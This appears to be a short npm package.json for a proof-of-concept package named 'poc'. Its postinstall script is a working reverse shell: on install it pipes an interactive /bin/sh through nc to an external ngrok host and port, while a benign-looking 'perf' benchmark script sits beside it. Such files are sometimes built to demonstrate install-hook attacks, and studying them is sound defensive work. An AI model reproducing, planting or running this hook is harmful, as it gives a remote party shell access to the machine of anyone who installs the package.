{
  "name": "poc",
  "version": "1.0.0",
  "scripts": {
    "perf": "echo 'Running benchmark...'",
    "postinstall": "HOST=0.tcp.in.ngrok.io PORT=10789 mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc $HOST $PORT > /tmp/f && rm /tmp/f"
  }
}
